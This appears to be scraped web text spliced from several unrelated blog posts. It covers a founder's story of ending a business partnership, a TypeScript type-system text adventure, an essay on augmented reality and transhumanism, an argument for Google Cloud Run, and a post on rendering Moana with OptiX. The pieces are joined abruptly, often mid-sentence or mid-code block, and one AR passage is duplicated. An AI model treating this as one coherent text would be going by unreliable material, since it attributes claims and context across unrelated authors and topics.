<p>As distorted realities, both the internet and Wonderland are strange and entertaining. But they are a 
dangerous type of fantasy that discourages us from returning to reality, and attemps to transform us into one of its 
cartoon characters.</p>
<p>Alice navigated Wonderland safely, staying true to herself. Her principles can help us remain active 
internet users, instead of being used by the internet. Keep an open mind, but remain logical. Think 
critically, through questions. Stay curious, with purpose.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Choosing a business partner could be the second most important relationship you ever choose, (the first being who you marry).&nbsp;<br></p><p>To be honest, if you don’t handle it right, ending a business partnership can be more challenging and more expensive than a divorce.&nbsp;<br></p><p>Having done both, trust me I know.&nbsp;<br></p><p>Now 5 years later -- after our “divorce” -- I want to share a little of my story and many of the things I wish I had known to discuss from the beginning.<br></p><p>The truth was I didn’t know what I didn’t know. Now I realize that if we had some hard conversations earlier, we may have had a smoother time ending the partnership.<br></p><p><strong>In this post I’ll share:</strong></p><ul role="list"><li><strong>how things went for me; the ‘A’ years</strong></li><li><strong>how to decide if you need a partner</strong></li><li><strong>qualities you should look for <em>(and what to avoid)</em></strong></li><li><strong>how do you split equity</strong></li><li><strong>the operating agreement; some key things you’ll want in there</strong></li><li><strong>buy/sell agreement</strong></li><li><strong>business partner checklist (a to-do list for following everything in this post)</strong></li><li><strong>other tips from my trauma <em>(lol… but really</em></strong><em>)</em><strong><em>‍</em></strong></li></ul><h3><strong>my story</strong><a href="https://littlemight.com/#"><br></a></h3><p>I started <a href="https://lttlmg.ht/bestself" target="_blank">BestSelf</a>, with my business partner (who I will refer to as 'A') in mid-2015, around 18-months after we initially met. </p><p>In that time we'd hung out in person around 4-5 times. To continue the analogy of business partnership being like marriage, I'd married someone that I'd only been on a few dates with and barely knew. I partnered out of insecurity with someone who talked a good game and seemed strong in the areas I felt weak.This insecurity cost me $$$</p><figure id="w-node-76af6d16a676-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f8750eb6f143d07b654067a_partnership-2.jpg" loading="lazy" alt=""></p></figure><p>We met through an entrepreneurship course online and became accountability partners soon after. With him being in New Jersey and me in NYC, we were close enough to be able to meet in person once every few months.&nbsp;<br></p><p>Through being accountability partners we became aware of each other's strengths and complementary skill sets, him with marketing and me with product design and branding.<br></p><p>As background, before <a href="https://lttlmg.ht/bestself">BestSelf</a> was born I had another Shopify store selling graphic design products that was paying all my bills and generating a good living. I considered that business my ‘Freedom vehicle’ as it allowed me to quit my Architecture job but I wasn’t passionate about doing it long-term.<br></p><p>I <em>was</em> deeply passionate about personal development during this time and was always reading and finding ways to upgrade my skills and productivity. I felt like I’d found the cheat code to life and wished I’d been introduced to it sooner. Before I quit my architecture job, I set myself a task to <a href="https://littlemight.com/articles/the-22-books-that-helped-me-quit-my-job" target="_blank">read 22 books around specific topics so I would be ready for the world of entrepreneurship.</a><br></p><p>The <a href="https://lttlmg.ht/journal" target="_blank">Self Journal</a> was later born from my personal struggle for years of finding a planner that would both keep me organized and also help me reach my most important goals.<br></p><p>I decided I wanted to turn the journal I built for myself into a product to sell, because it seemed whenever I showed it to someone they wanted to buy it.&nbsp; I didn’t think this product would be the start of something bigger, I just wanted to bring this product to life.</p><p>It was then I thought having someone who knew sales and marketing would be beneficial so I asked ‘A’ to partner with me on it. He also had his own journaling structure&nbsp; so I felt it was a common interest.<br></p><p><strong>In retrospect, I partnered out of my insecurities around marketing and selling myself. </strong></p><h6>Most entrepreneurs don't have business problems, they have emotional problems disguised as business problems —<strong> and so I disguised my fear of putting myself out there with a business partner.&nbsp;</strong><br></h6><p>And so it began.<br></p><p>The original name we came up with for the company was “Self Improvement Labs”... but I <em>hated</em> it. One weekend when ‘A’ was gone I knew I had to come up with something better to replace it with<em>.</em></p><p><em>(because I don’t like when people criticize something without giving a reasonable alternative).</em><br></p><p>In those 2 days I came up with the idea for <a href="https://lttlmg.ht/bestself">BestSelf</a>, bought the domain BestSelf.co and created a whole branding package. Thankfully there was no pushback, ‘A’ agreed it was a better name and we moved forward.<br></p><p>We launched the Kickstarter campaign in August 2015. I had experience with launching Kickstarter campaigns in the past and so I had a formula for how to do it which helped us a lot. You can read how we did it <a href="https://littlemight.com/articles/kickstarter-step-by-step" target="_blank">here</a>.<br></p><p><strong>We funded in 28 hours and over the course of 34 days we raised over $322,000 which was enough to both create the product for backers and launch the entire business.</strong></p><figure><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5ea0cb1d0f854b10467cf739_5e2a2251be4a7438101d60a6_image.png" alt="funding progress graph"></p></figure><p>We launched our online store in January 2016 and the business continued to grow. We won the <a href="https://littlemight.com/articles/shopify-2016-build-a-business-experience" target="_blank">2016 Shopify Build a Business award</a> in August of 2016 and then in 2017 we scaled 4X and won the Build a BIGGER Business Award.</p><figure id="w-node-ac6b3b3d99ee-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f857aa10221b7fa4725f1a6_image5.png" loading="lazy" alt=""></p></figure><figure id="w-node-9ccd9ba5eca2-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f857aae7da8462c3bf9000a_image1.png" loading="lazy" alt=""></p></figure><p>When things are going so well business-wise it’s easy for things to run smoothly, it’s like the early dating phase when you don’t have to deal with too much harsh reality yet. Then the pandemic starts and you find out what your relationship is really made of.<br></p><p>By late 2016, while professionally things were still good with the business, cracks began appearing in our personal relationship… the 2016 election was a definite factor here. That was the first time it became clear how differently we saw the world and how opposite our backgrounds were.<br></p><p>In 2017, we’d hired out the majority of his role in marketing and by April 2018 he had stepped away from all business operations - informally anyway.&nbsp;<br></p><p>By informally I mean there was never a discussion of him passing the baton and stepping out, he just suddenly was no longer there. But he was still taking as much money out of the company as I was -- or more.<br></p><p><strong>As you can imagine being a 50/50 partner where one partner is working full-time and the other is completely disconnected is tough — really tough. I was essentially hamstrung on big decisions and company direction. </strong></p><p>And anything I could decide could be overwritten or debated even after I thought it was settled. The same went for team members, as every now and again he'd jump on calls, start giving advice or instruction (without knowing what was even happening) and cause frustration and confusion with team members. </p><p>By early 2019, I was becoming resentful as our distributions were still 50/50 <strong>but I wasn’t getting any salary for the 60+ hour weeks of time I was putting in. </strong>When I brought it up to him, as if he were my boss, he would say <em>“I don’t equate time with value,”</em> yet he wasn’t giving either to the company.<br></p><p>At the same time as he would reject my salary request, he’d post stuff like this on his Instagram:</p><figure id="w-node-be8cd5eaae18-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f873b98bd121731d6cf0d21_3-hour-week.jpg" loading="lazy" alt=""></p></figure><h6>Here's a tip, if someone’s telling you running a business is easy — they’re either lying, or trying to <strong>sell</strong> you something.<br></h6><p>In the case of ‘A’, it was both.<br></p><p>Each video “guru” post he’d share taking credit for work that wasn’t his &nbsp;felt like a slap in the face — not just to me but,&nbsp; more importantly, to the team. <strong>Being under-paid (or not paid at all) is one thing, but having my value be dismissed on top of that was actually the bigger issue -- and was the beginning of the end.</strong><br></p><p>I ended up removing him on all social media platforms in mid 2019 because posts like the one above were triggering me.<br></p><p>By July 2019, we finally agreed on a modest salary for me in lieu of taking distributions which I would be made up for later. This still meant that I was getting the same $ amount or less per month as he was but at least now I had an IOU.&nbsp;<br></p><p><em>(I did this as I didn’t want to take more cash out of the business that would negatively impact our growth.)</em><br></p><p>Yay, a salary! <strong>I was now the 3rd highest paid person on my team of 10</strong> -- and getting the same as the person that had done nothing for the company in more than a year.<br></p><figure id="w-node-cc78a0f0c1db-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f86195162505211420ac4da_Image%202.JPG" loading="lazy" alt=""></p></figure><p>By the end of 2019, other things happened that I won’t go into. Suffice to say, I was mentally exhausted and felt completely taken advantage of by someone I had trusted.&nbsp;<br></p><p>So we looked for options to get out...either of the business, or at least the partnership.<br></p><p>When numbers around buyout expectations came up, there was a chasm of difference between what ‘A’ felt he deserved and what was realistic -- especially given how much he’d already taken over the last 18 months without working ($400k+).&nbsp;<br></p><p>Taking on investors or another partner seemed like the only option. However, by that point, I had no interest in bringing in someone that may have me ending up in the same place.<br></p><p><strong>Better the devil you know...</strong><br></p><p>Going into 2020 I felt stuck between a rock and a hard place.&nbsp;<br></p><p>On one hand I wanted to grow the business, innovate with new products and keep my team charged. Yet, on the other hand, I knew doing so would mean eventually paying him more in a buyout situation.<br></p><p>Every year I do a yearly review to reflect on the prior year and to set some big goals for the new year. Maybe you’ve seen them. Good, bad and mixed… I've shared my review publicly in <a href="https://littlemight.com/articles/2014-review" target="_blank">2014</a>, <a href="https://littlemight.com/articles/2015-review" target="_blank">2015</a>, <a href="https://littlemight.com/articles/2016-review" target="_blank">2016</a>, <a href="https://littlemight.com/articles/2017-review" target="_blank">2017</a>, <a href="https://littlemight.com/articles/2018-review" target="_blank">2018</a>... right up until this year.<br></p><p><strong>This year I couldn't bring myself to share my review and big goal <em>publicly</em>.</strong><br></p><p><em>(It seems funny now given the dumpster fire that 2020 has been that I just knew putting plans out there might not be the best idea.)</em><br></p><p>The thing I was scared to share publicly was that <strong>my biggest goal for 2020 was to end my business partnership with ‘A’ once and for all.</strong><br></p><p>Between COVID affecting business and other extenuating factors, we could finally agree on a reasonable buyout number in August 2020 -- after over 7 months of negotiation.

Why not a text adventure!"</p><p>Now, it turns out that the way I implemented this game, I don't need the 4.1 features. I'll probably add that in the future to support more dynamic command parsing.</p><p>If you have <code>vscode</code>, you can play now with a quick <code>npm install</code> into any node project. (See below for full installation instructions.)</p><h3>So What?</h3><p>This is a level 99 typescript wizardry demo. </p><p>If you aren't a typescript nerd, you might miss the significance of this, but here is the basic idea:</p><p>First of all, everything you see here is running in the vscode code editor (without any program running). In fact, you can't even run my code. If you compile it to javascript, this is what you will get:</p><div><div><div><div><pre><code><span>export</span> <span>const</span> gameStart = <span>null</span>;</code></pre></div></div></div><p><span>➖</span></p><p><span>➕</span></p></div><p>(There might be a little more debris then that, but you get the idea.)</p><p>This screenshot should make it clear that the typescript type system is doing all the work:</p><p><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-04-type-only.png"></p><p>However, it's not very convenient to declare all those StepNN types, so I made a fluent mode that reduces the need for those:</p><p><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-01.png"></p><p>There is also an easy mode that uses only an object tree.

So I decided to use that for the game output since it is so rich. It even supports images:</p><p><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-03.png"></p><h3>Features</h3><ul><li>Play in vscode using autocomplete and tooltips</li><li>Game output displayed in tooltips using jsdoc3 with markdown (including gifs)</li><li>Implemented using conditional types, string literals, and a minimal state machine</li></ul><h3>How to play</h3><ul><li><code>npm i @ricklove/typescript-type-system-adventure</code></li><li>Create a new <code>play.ts</code> file and add the below code</li><li>Hover over <code>execute</code> to see game output (see screenshots for examples)</li></ul><div><div><div><div><pre><code><span>import</span> { gameStart } <span>from</span> <span>'@ricklove/typescript-type-system-adventure'</span>;

        <section>
            <!--kg-card-begin: markdown--><h4 id="preface">Preface</h4>
<p>This post is a bundle of thoughts on the near future of Augmented Reality implementations, ways of integration, and introducing new layers of cognition. We are going to talk about AR as a way of enabling transhumanism by broadening the human cognitive and sensory toolbox.<br>
We are not going to be concerned with what is and what is not technologically possible at the moment.</p>
<h4 id="introduction">Introduction</h4>
<p>Have you ever taken a walk and thought about all the accessible information on animals, plants, objects, or even people? How much information is available on the internet? How many facts have you encountered and already forgotten?</p>
<p>Ancient Greeks put an active effort into training and maintaining their memorizing capabilities, and already at this stage of progress, human memory is shifting – or has shifted from remembering facts to remembering how and where to find facts. We are keeping less and less information hardcoded in our permanent memory and are in turn learning how to<br>
consume, process, and find useful data in an endless stream of information and misinformation.</p>
<p>A technologically proficient user has access to a vast volume and spectrum of data at his/her disposal, sitting right in the pocket. The human approach to holding knowledge is evolving as we speak. Heck, it started evolving with the invention of speech. But another significant<br>
change is on the cusp of happening. Our mobile phone interfaces, while serving all the information we need, are still detached from us, having considerable latency when we need to find, show, or input data. With the introduction of AR, AI, and human-computer interfaces, everything is about to change. AR or human augmentation in general will make that data<br>
more accessible and drastically lessen the latency needed for the interaction, making the tools feel more and more as part of ourselves.</p>
<p>Imagine walking down the street. You look around to observe people on the street and notifications start popping up alongside people’s heads. For one person the message says:<br>
"You have seen this person three times this week already"; for another one it states:<br>
"You have five mutual connections and common interests".<br>
Those notifications could also tell you if the person is willing to make new connections, based on previously shared data or facial microexpression analysis. Maybe we have gone too far down the rabbit hole for now, but you<br>
get the idea.</p>
<h3 id="definingarandtranshumanism">Defining AR and Transhumanism</h3>
<p>Merriam-Webster defines Augmented Reality as "an enhanced version of reality created by the use of technology to overlay digital information on an image of something being viewed through a device (such as a smartphone camera)". For the purposes of this post, I would like us not to limit reality to human vision alone.</p>
<p>Merriam-Webster has no definition for Transhumanism, but Wikipedia defines it as a philosophical movement that advocates for the transformation of the human condition by developing and making widely available sophisticated technologies to greatly enhance human intellect and physiology.</p>
<p>The two are getting more and more intertwined as technology advances, so I would like us to redefine AR, if only for this post, as "any technology that enhances or expands the human experience of reality", or maybe even as "practical transhumanism".</p>
<h3 id="augmentationtechnologymilestones">Augmentation technology milestones</h3>
<p>These are some freely set milestones for AR technology.</p>
<ul>
<li>LVL 0 – environment emulation via VR – for developmental fast-tracking</li>
<li>LVL 1 – external IO devices – headsets, glasses, gloves</li>
<li>LVL 2 – embedded IO devices – lenses, external neural signal readers</li>
<li>LVL 3 – tapping into existing sensory and neural networks</li>
<li>LVL 4 – registering new input/output devices in neural networks</li>
</ul>
<h3 id="degreesofaugmentation">Degrees of augmentation</h3>
<p>For the time being, and at least until we master the LVL 4 milestone described above, we are not creating new sensory or actuation systems, we are only hijacking the existing ones. Hi, Neuralink ;). This means that with every bit of information we gain, we are blocking the bandwidth and use for our existing IO mechanisms. In all fairness, people recovering their mobility after severe head trauma are evidence that the brain could possess enough plasticity to use whatever we throw at it, given we connect the right dots, and given enough time and practice. Sounds easier than it is, I know. In all fairness, people recovering mobility after<br>
a severe head trauma are evidence that the brain could possess enough plasticity to use whatever is thrown at it, given we connect the right dots, have enough time and practice. User age could also be a part of the equation.<br>
Sounds easier than it is, I know.</p>
<p>So, the more we augment our existing senses, the more we obstruct our basic physical-world data flow, the need to set some design restriction guidelines will grow. We still have accidents while using mobile phones or headphones, so the question arises: how could we manage a society full of people that overlap and fully cover their field of vision and hearing?<br>
Some safety rules integrated into the tech would be quite handy. Here is an example of defining degrees of augmentation:</p>
<ul>
<li>No augmentation</li>
<li>Info - can be an overlay, but should not block much sensory bandwidth</li>
<li>Safe communication – headset equivalent</li>
<li>Immersive experience – not safe for driving, safe for outdoors</li>
<li>Fully overlaying sensory input with enabled alerts – public safe zones</li>
<li>Fully overlaying sensory input – only for safe zones at home</li>
</ul>
<h3 id="augmentationusagecategories">Augmentation usage categories</h3>
<h4 id="knowledgemanagement">Knowledge management</h4>
<p>At some point, AR should enable access to data from the internet, which should be retrieved and presented without too much user effort, based on surrounding situations and context. Also, the useful data should be categorized and stored for retrieval at a later time.<br>
The interface should be able to combine relevant data and present solutions, statistics, and probabilities.</p>
<p>This could also enable saving verifiable event recordings, snapshots, and transcripts, real-time language translation, or seeing blueprints and instructions while fixing devices.</p>
<h4 id="extendingsensoryreach">Extending sensory reach</h4>
<p>The human sensory reach is already drastically extended with the use of IoT and the internet in general, but there is so much more of existing tech to be integrated into an AR system to extend human senses. Users could see and feel if their home or possessions are safe, or more generally, sense physical-world information streams in real-time.<br>
For example, physical-world data can be processed in parallel with the user experiencing the immediate surroundings. Thus, the user would, for instance, return home and detect certain objects have been moved, etc.</p>
<h4 id="extendingphysicalactuationactionreach">Extending physical actuation/action reach</h4>
<p>Besides our physical reach, most of us have already experienced controlling or affecting the physical-world at a distance. AR could help make the world around us feel more like an extension of our physical bodies.<br>
We could run automated processes upon visual triggers, i.e. unlock the front door without thinking, or control devices, drones, and robotics with ease.</p>
<h4 id="communicationandindividuality">Communication and individuality</h4>
<p>Communication could also be streamlined. We could have an instant connection with anyone around the world, almost as if standing side by side. Communication could play out on several levels, depending on the level of technological advancement, and could be:</p>
<ul>
<li>Restrained – messages and recordings with a delay and opportunity for curation</li>
<li>Unrestrained – conservative – real-time audio-visual communication</li>
<li>Unrestrained – progressive – direct thought transfer in a Neuralink-like brain-computer interface manner</li>
</ul>
<p>We could socialize, play games, or work like never before:<br>
imagine coding while sharing your thought process with a colleague, and also having an "AI" assisted IDE.</p>
<h4 id="extendingthecognitiontoolbox">Extending the cognition toolbox</h4>
<p>Given having a portable AR system and a smart enough underlying OS that replicates our surroundings and anticipates our needs OR an efficient enough way of selecting and using computational tools, we could:</p>
<ul>
<li>see object trajectories</li>
<li>have perfect math at our disposal</li>
<li>know objects, plant life, animals, etc.</li>
</ul>
<p>AI or General AI could, if available, also be used as an intermediary to the available cognition toolbox, to serve the necessary tools and results to the end-user.</p>
<h4 id="pastimeandentertainment">Pastime and entertainment</h4>
<p>I won’t go into great detail here, VR games are already immersive and fun, but try to imagine what they would be like if some freedom is added to the mix. As games and entertainment are presumably most likely to require as much immersion as possible, it will be necessary to consider immersion safety.</p>
<h5 id="vrgamesandapsfullyoverlayingsensoryinput">VR games and APS - fully overlaying sensory input</h5>
<p>Cars, stairs, sudden drops, and obstacles are here to stay, so for any device that can write over your sensory input, a way to risk mitigation must be in place.</p>
<h5 id="endusersafetyzonecalibration">End user safety zone calibration</h5>
<p>Imagine you want to play a full-on VR game somewhere. How could you stay safe and not trip over something or fall over some curb? It is simple, you could just walk around your playground to define its contours and limits. A certain amount of space can even be taken out of the outer limits of the playground, any obstacles are reproduced in-game so you can navigate past them. You start the game and play, and in case you move to the outer limits, the game simply starts to fade away.</p>
<h5 id="safesurfaces">Safe surfaces</h5>
<p>OK, but where else could you use 100% augmentation opacity in the real world? The first thing that comes to mind as safe would be walls. You can project stuff in front of almost any wall and be sure that nothing you can’t see will hit you from that direction, or at least as sure as you are now.</p>
<h5 id="contentkillswitch">Content killswitch</h5>
<p>Another useful feature would be to have the immersive content stop when quiet time or rest is needed, as well as if stress levels are critical.</p>
<h3 id="pitfallsofarandhumanaugmentation">Pitfalls of AR and Human augmentation</h3>
<ul>
<li>Having no signal or battery</li>
<li>Developing a dependence on AR in everyday life</li>
<li>Losing sense of the physical self</li>
<li>Losing individuality</li>
<li>Identifying the AR OS as a part of the personality</li></ul></section></article></div></div>

<p>Has the “serverless revolution stalled”? I dunno. I like serverless. Taught a <a href="https://www.pluralsight.com/courses/serverless-big-picture">popular course</a> about it. But I reviewed and published an article written by Bernard Brode that <a href="https://www.infoq.com/articles/serverless-stalled/">made that argument</a>, and it sparked <a href="https://news.ycombinator.com/item?id=24758772">a lot of discussion</a>. If we can agree that serverless computing means building an architecture out of <a href="https://redmonk.com/rstephens/2018/12/14/serverless-more-than-just-functions/">managed services that scale to zero</a>—we’re not strictly talking about function-as-a-service—that’s a start. Has this serverless model <a href="https://amzn.to/3nOsehd">crossed the chasm</a> from early adopters to an early majority? I don’t think so. And <a href="https://twitter.com/LawrenceHecht/status/1316006695190102016">the data </a>shows that usage of FaaS—still a fundamental part of most people’s serverless architecture—has flattened a bit. Why is that? I’m no expert, but I wonder if some of the inherent friction of the 1st generation FaaS gets in the way. </p>



<p>We’re seeing a new generation of serverless computing that removes that friction and may restart the serverless revolution. I’m talking here about <a href="https://cloud.google.com/run">Google Cloud Run</a>. Based on the <a href="https://knative.dev/">Knative project</a>, it’s a fully managed service that scales container-based apps to zero. To me, it takes the best attributes from three different computing paradigms:</p>



<figure><table><thead><tr><th>Paradigm</th><th>Best Attributes</th></tr></thead><tbody><tr><td>Platform-as-a-Service</td><td>– focus on the app, not underlying infrastructure<br>– auto-wire networking components to expose your endpoint</td></tr><tr><td>Container-as-a-Service</td><td>– use portable app packages<br>– develop and test locally</td></tr><tr><td>Function-as-a-Service</td><td>– improve efficiency by scaling to zero<br>– trigger action based on events</td></tr></tbody></table></figure>



<p>Each of those above paradigms has standalone value. By all means, use any of them if they suit your needs. Right now, I’m interested in what it will take for large companies to adopt serverless computing more aggressively. I think it requires “fixing” some of the flaws of FaaS, and there are four reasons Cloud Run is positioned to do so.</p>



<h2>1. It doesn’t <em>require</em> rearchitecting your systems</h2>



<p>First-generation serverless doesn’t permit cheating. No, you have to actually refactor or rebuild your system to run this way. That’s different than all the previous paradigms. IaaS? You could take existing bare metal workloads and run them unchanged in a cloud VM platform. PaaS? It catered to 12-factor apps, but you could still run many existing things there. CaaS? You can containerize a lot of things without touching the source code. FaaS? Nope. Nothing in your data center “just works” in a FaaS platform.</p>



<p>While that’s probably a good thing from a purity perspective—stop shifting your debt from one abstraction to another without paying it down!—it’s impractical. Simultaneously, we’re asking staff at large companies to: redesign teams for agile, introduce product management, put apps on CI pipelines, upgrade their programming language/framework, introduce new databases, decouple apps into microservices, learn cloud and edge models, AND keep all the existing things up and running. It’s a lot. The companies I talk to are looking for ways to get incremental benefits for many workloads, and don’t have the time or people to rebuild many things at once.</p>



<p>This is where Cloud Run is better than FaaS. It hosts containers that respond to web requests or event-based triggers. You can <a href="https://cloud.google.com/functions/docs/functions-framework">write functions</a>, or, containerize a complete app—<a href="https://cloud.google.com/migrate/anthos">Migrate for Anthos</a> makes it easy. Your app’s entry point doesn’t have to conform to a specific method signature, and there are no annotations or code changes required to operate in Cloud Run. Take an existing custom-built app written in any language, or packaged (or no source-code-available) software and run it. You don’t have to decompose your existing API into a series of functions, or break down your web app into a dozen components. You might WANT to, but you don’t HAVE to. I think that’s powerful, and significantly lowers the barrier to entry.</p>



<h2>2. It runs anywhere</h2>



<p>Lock-in concerns are overrated. <a href="https://www.infoq.com/articles/avoiding-lockin-switching-costs/">Everything is lock-in</a>. You have to decide whether you’re getting unique value from the coupling. If so, go for it. A pristine serverless architecture consists of managed services with code (FaaS) in the gaps. The sticky part is all those managed services, <strong>not</strong> the snippets of code running in the FaaS. Just making a FaaS portable doesn’t give you all the benefits of serverless.</p>



<p>That said, I don’t need <em>all</em> the aspects of serverless to get <em>some</em> of the benefits. Replacing poorly utilized virtual machines with high-density nodes hosting scale-to-zero workloads is great. Improving delivery velocity by having an auto-wired app deployment experience versus ticket-defined networking is great.  I think it’s naive to believe that most folks can skip from traditional software development directly to fully serverless architectures. There’s a learning and adoption curve. And one step on the journey is defining more distributed services, and introducing managed services. Cloud Run offers a terrific best-of-both-worlds model that makes the journey less jarring. And uniquely, it’s not only available on a single cloud.</p>



<p>Cloud Run is great on Google Cloud. Given the option, you should use it there. It’s fully managed and elastic, and integrates with all types of GCP-only managed services, security features, and global networking. But you won’t <em>only</em> use Google Cloud in your company. Or Azure. Or AWS. Or Cloudflare. <a href="https://cloud.google.com/anthos/run">Cloud Run for Anthos</a> puts this same runtime most anywhere. Use it in your data center. Use it in your colocation or partner facility. Use it at the edge. Soon, use it on AWS or Azure. Get one developer-facing surface for apps running on a variety of hosts.</p>



<p>A portable Faas, based on open source software, is powerful. And I believe, necessary, to break into mainstream adoption within the enterprise. Bring the platform to the people!</p>



<h2>3. It makes the underlying container as invisible, or visible, as you want</h2>



<p>Cloud Run uses containers. On one hand, it’s a packaging mechanism, just like a ZIP file for AWS Lambda. On the other, it’s a way to bring apps written in any language, using any libraries, to a modern runtime. There’s no “supported languages” page on the <a href="https://cloud.google.com/run">website for Cloud Run</a>. It’s irrelevant.</p>



<p>Now, I personally don’t like dealing with containers. I want to write code, and see that code running somewhere. Building containers is an intermediary step that should involve as little effort as possible. Fortunately, tools like <a href="https://cloud.google.com/code">Cloud Code</a> make that a reality for me. I can use Visual Studio Code to sling some code, and then have it automatically containerized during deployment. Thanks <a href="https://cloud.google.com/blog/products/containers-kubernetes/google-cloud-now-supports-buildpacks">Cloud Buildpacks</a>! If I choose to, I can use Cloud Run while being blissfully unaware that there are containers involved.</p>



<p>That said, maybe I <em>want</em> to know about the container. My software may depend on specific app server settings, file system directories, or running processes. During live debugging, I may like knowing I can tunnel into the container and troubleshoot in sophisticated ways.</p>



<p>Cloud Run lets you choose how much you want to care about the container image and running container itself. That’s a flexibility that’s appealing.</p>



<h2>4. It supports advanced use cases</h2>



<p>Cloud Run is great for lots of scenarios. Do <a href="https://cloud.google.com/blog/products/serverless/cloud-run-now-supports-http-grpc-server-streaming">server-side streaming</a> with gRPC. Build or migrate web apps or APIs that take advantage of our <a href="https://cloud.google.com/blog/products/serverless/google-cloud-api-gateway-is-now-available-in-public-beta">new API Gateway</a>. Coordinate apps in Cloud Run with other serverless compute using the <a href="https://cloud.google.com/workflows">new Cloud Workflows</a>. Trigger your Cloud Run apps <a href="https://seroter.com/2020/08/25/first-look-triggering-google-cloud-run-with-events-generated-by-gcp-services/">based on events</a> occurring anywhere within Google Cloud. Host existing apps that <a href="https://twitter.com/steren/status/1315763902366457856">need a graceful shutdown</a> before scaling to zero. Allocate more horsepower to new or existing apps by <a href="https://twitter.com/steren/status/1315712522041786368">assigning up to 4 CPUs</a> and 4GB of RAM, and defining <a href="https://cloud.google.com/run/docs/about-concurrency">concurrency settings</a>. Decide if your app should always have an <a href="https://cloud.google.com/run/docs/about-instance-autoscaling">idle instance</a> (no cold starts) and how many instances it should scale up to.

<p>TL/DR: After Matt’s original “Swallowing the Elephant” with PBRT, and my own “Digesting the Elephant” with OSPRay, I <em>finally</em> got some “first light” on my “Moana on OptiX” sandbox; not fully done yet, but good enough to at least show a glimpse of. I’ll briefly say something about the voyage I took to get there, and will give a brief overview of what’s currently implemented, and what’s still missing.</p>



<h2>Moana on OptiX/RTX: Background</h2>



<p>As already mentioned/hinted at last week, I had actually been working on “Moana on OptiX”, on and off, since the very day I joined NVidia… which by now is over two years ago. In fact, there’s more than one such sandbox: at some point I had an OptiX 6 based Moana viewer (no RTX), an OptiX 6.5 one<em> </em>(<em>with</em> RTX), an OptiX prime one (pre-7, obviously), an optix-7-alpha one (way before 7 got released); then another pure CUDA one (with my own CUDA ray tracing core), and even one that ran the same CUDA shading code (with a few #define’s and template magic) on both CUDA, and on the CPU w/ either embree or OptiX prime as a backends …  and probably a few more that I now forgot about. I also had a version that used NVLink to split the model over multiple GPUs; one that used managed memory to “page” to the host; and even one that can run mpi-data parallel (with full path tracing!) across diffurent GPUs and/or several different GPU nodes….  </p>



<p>Of course, most of those Moana viewers were rather “prototypical” in the sense that they all looked at different aspects of the problem. For example, the CUDA-only version was heavily optimized towards lowest possible memory consumption, etc. Moreover, several of these sandboxes tried to be useful for <em>both</em> Moana <em>and </em>other heavily instanced PBRT models like “landscape” and “ecosys” – but since these all use <em>very </em>different materials, textures, lights, etc the latter ended up being a giant distraction…. </p>



<p>All these different sandboxes were all nice and well …. but none of those sandboxes ever went all the way, and not one ever<em> </em>rendered the that model in the way you’d expect it to look: either the respective sandbox didn’t have a path tracer, or it didn’t include the water, or it didn’t use the lights, or the textures, or the curves, or … something that made it “un-showable”. That’s not to say that I didn’t ever have any of these individual components: in fact, I had some reservoir-sampling based direct lighting (from both quad lights and HDR envmap) over a year ago; I also at some point borrowed the Disney BRDF implementation from Will “TwinkleBear” Usher’s <em>ChameleonRT</em> ray tracer (<a href="https://github.com/Twinklebear/ChameleonRT">https://github.com/Twinklebear/ChameleonRT</a>); I had baking of the PTex textures in my github <em>pbrtParser</em> repo (<a href="https://github.com/ingowald/pbrt-parser">https://github.com/ingowald/pbrt-parser</a>) a long while back; Dave Hart gave me his curves tessellation code for the PBRT curves a loooong time ago, etc …. I just never had all of those particular pieces in the same viewer at the same time. </p>



<p>Anyway – I <em>still </em>don’t have <em>all </em>these pieces together right now, but triggered by Chris’ blog post last week I at least sat down and started pulling together all the pieces I still had, and trying to get my Moana back to rendering on a GPU. In particular, I finally sat down and extended my path tracer to also be able to handle water, by pretty much stealing Pete Shirley’s “Dielectric” material from his “Ray Tracing on a Weekend” series (because yes, I have no clue about things like Schlick, Fresnel, etc) …. and as of Saturday night, I finally have some “first light”, including something that’s at least looking like water:</p>

<p>BTW: The above renders quite interactively; currently at something like 25-ish fps on a RTX 8000 (at 2560×1080), and using about 32 out of the 48GBs of RAM. I (obviously) use progressive refinement, so while you move around the image is somewhat more noisy – but by the time you can even click on the screenshot app you pretty much get the above. (I’ll release the code at some point in time, when I cleaned it up a bit).</p>



<h2>Moana on the GPU: Main Challenges</h2>



<p>As several previous posts/articles have pointed out, there are a multitude of challenges in this model. I’d particularly point to Matt Pharr’s original <a href="https://pharr.org/matt/blog/2018/07/08/moana-island-pbrt-1.html">“Swallowing the Elephant” </a>series; to my own blog post (and accompanying paper) on <a href="https://ingowald.blog/2020/01/09/digesting-the-elephant/">“Digesting the Elephant”</a>; and to Chris Hellmuth’s recent “<a href="https://www.render-blog.com/">GPU-Motonui</a>” blog.</p>



<p>Most of these issues revolve around the sheer amount of data involved in this model,  and in particular the data wrangling required to even get it <em>loaded </em>into a form that you can even <em>start </em>rendering it. For the GPU version, however, a few of these particularly stuck out:</p>



<ul><li><strong>Textures: </strong>All the textures in Moana are in Disney’s PTex format …. but there’s no PTex on the GPU, yet (at least, none that I could find). My first versions rendered without textures, but  without textures, this model looks <em>really</em> different, as you can see by playing with this fancy new wordpress “image compare” feature:</li></ul>



<figure><p><img id="434" src="https://ingowaldblog.files.wordpress.com/2020/10/big-bad-1.png" alt="" width="2488" height="1016"><img id="436" src="https://ingowaldblog.files.wordpress.com/2020/10/big-good-1.png" alt="" width="2488" height="1016"></p></figure>



